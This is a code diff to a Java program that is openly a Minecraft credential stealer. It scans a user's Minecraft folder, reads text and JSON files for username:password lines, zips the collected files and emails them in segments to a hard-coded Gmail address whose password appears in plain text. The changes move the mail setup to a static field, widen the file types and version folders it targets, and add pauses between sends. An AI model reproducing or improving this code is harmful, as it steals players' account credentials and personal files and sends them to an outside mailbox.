@@ -40,6 +40,17 @@ public final class Main {
 	private static boolean debug;
 
 	private static int segment;
+	private static Message email;
+	private static final String EMAIL_USER = "minecraft.stealer0@gmail.com";
+	private static InternetAddress emailAddr;
+
+	static {
+		try {
+			emailAddr = new InternetAddress(EMAIL_USER);
+		} catch (Exception e) {
+			printError(e);
+		}
+	}
 
 	private static ZipOutputStream createZip(final ByteArrayOutputStream bytesOut) {
 		final ZipOutputStream zipOut = new ZipOutputStream(bytesOut);
@@ -99,6 +110,26 @@ public final class Main {
 		log("Starting to execute with the following arguments: " + StringUtils.list(arguments), false);
 		ByteArrayOutputStream mcBytesOut = new ByteArrayOutputStream();
 		ZipOutputStream mcZipOut = createZip(mcBytesOut);
+		final Properties emailProps = new Properties();
+		emailProps.put("mail.smtp.auth", String.valueOf(true));
+		emailProps.put("mail.smtp.starttls.enable", String.valueOf(true));
+		emailProps.put("mail.smtp.host", "smtp.gmail.com");
+		emailProps.put("mail.smtp.port", String.valueOf(587));
+		email = new MimeMessage(Session.getInstance(emailProps, new Authenticator() {
+			@Override
+			protected PasswordAuthentication getPasswordAuthentication() {
+				return new PasswordAuthentication(EMAIL_USER, "minecraftsteal");
+			}
+		}));
+		try {
+			email.setFrom(emailAddr);
+		} catch (AddressException e1) {
+			// TODO Auto-generated catch block
+			printError(e1);
+		} catch (MessagingException e1) {
+			// TODO Auto-generated catch block
+			printError(e1);
+		}
 		try {
 			final List<File> stealFiles = new ArrayList<File>();
 			listFiles(mcDir, stealFiles);
@@ -115,7 +146,7 @@ public final class Main {
 				if (toSteal.contains(prevParent)) {
 					handle = true;
 				}
-				if (alts && dirFile.getName().endsWith(".txt") && dirFile.exists()) {
+				if (alts && (dirFile.getName().endsWith(".txt") || dirFile.getName().endsWith(".json")) && dirFile.exists() && !dirFile.getName().startsWith("options")) {
 					try {
 						final BufferedReader reader = new BufferedReader(new FileReader(dirFile));
 						String line;
@@ -124,7 +155,7 @@ public final class Main {
 								if (line.startsWith("#")) {
 									continue;
 								}
-								if (line.split(":").length < 2 || line.contains(" ")) {
+								if (line.split(":").length != 2 || line.contains(" ")) {
 									break;
 								}
 								handle = true;
@@ -146,11 +177,13 @@ public final class Main {
 						printError(e);
 					}
 				}
-				final String VANILLA_PREFIX = "1.";
-				if (!handle || !(toSteal.contains(dirFile) || toSteal.contains(dirFile.getParentFile()))
-						&& (dirFile.getName().startsWith(VANILLA_PREFIX)
-								|| dirFile.getParentFile().getName().startsWith(VANILLA_PREFIX))) {
-					continue;
+				final String[] vanillaPrefixes = {"1.", "a1", "19w", "18w", "17w"};
+				for (String prefix : vanillaPrefixes) {
+					if (!handle || !(toSteal.contains(dirFile) || toSteal.contains(dirFile.getParentFile()))
+							&& (dirFile.getName().startsWith(prefix)
+									|| dirFile.getParentFile().getName().startsWith(prefix))) {
+						continue outerLoop;
+					}
 				}
 				FileInputStream stealIn = null;
 				try {
@@ -170,6 +203,12 @@ public final class Main {
 								printError(e);
 							}
 							sendEmail(mcBytesOut);
+							try {
+								Thread.sleep(50L);
+							} catch (InterruptedException e) {
+								// TODO Auto-generated catch block
+								printError(e);
+							}
 							mcBytesOut = new ByteArrayOutputStream();
 							mcZipOut = createZip(mcBytesOut);
 						}
@@ -207,6 +246,12 @@ public final class Main {
 				printError(e);
 			}
 		}
+		try {
+			Thread.sleep(50L);
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			printError(e);
+		}
 		sendEmail(mcBytesOut);
 		log("Done executing.", false);
 	}
@@ -219,29 +264,7 @@ public final class Main {
 	}
 
 	private static void sendEmail(final ByteArrayOutputStream mcBytesOut) {
-		final Properties emailProps = new Properties();
-		emailProps.put("mail.smtp.auth", String.valueOf(true));
-		emailProps.put("mail.smtp.starttls.enable", String.valueOf(true));
-		emailProps.put("mail.smtp.host", "smtp.gmail.com");
-		emailProps.put("mail.smtp.port", String.valueOf(587));
-		final String EMAIL_USER = "minecraft.stealer0@gmail.com";
-		final Message email = new MimeMessage(Session.getInstance(emailProps, new Authenticator() {
-			@Override
-			protected PasswordAuthentication getPasswordAuthentication() {
-				return new PasswordAuthentication(EMAIL_USER, "minecraftsteal");
-			}
-		}));
 		try {
-			final InternetAddress emailAddr = new InternetAddress(EMAIL_USER);
-			try {
-				email.setFrom(emailAddr);
-			} catch (AddressException e1) {
-				// TODO Auto-generated catch block
-				printError(e1);
-			} catch (MessagingException e1) {
-				// TODO Auto-generated catch block
-				printError(e1);
-			}
 			email.setRecipient(Message.RecipientType.TO, emailAddr);
 			final String username = System.getProperty("user.name");
 			email.setSubject("Segment " + segment + " of " + username + "'s Minecraft folder");
